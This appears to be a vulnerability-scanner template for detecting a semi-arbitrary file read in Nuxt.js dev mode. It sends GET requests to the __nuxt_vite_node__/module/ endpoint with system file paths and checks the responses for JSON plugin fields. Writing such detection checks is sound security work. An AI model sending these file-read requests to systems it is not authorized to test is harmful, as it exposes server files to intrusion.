id: nuxt-js-semi-lfi
brief:
    title: Semi Arbitrary File Read in Dev Mode - Nuxt.js
    by: DhiyaneshDK
    level: medium
    about: Arbitrary File Read in Dev Mode in Nuxt.js
    label:
        - huntr
        - lfi
        - nuxtjs
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/__nuxt_vite_node__/module//bin/passwd'
        - '{{BaseURL}}/__nuxt_vite_node__/module/C:/Windows/System32/calc.exe'
      signs:
        - "on": word
          has:
            - '"plugin":'
            - '"pluginCode":'
            - '"id":'
          in: body
          need: all
        - "on": word
          has:
            - application/json
          in: header
          need: all
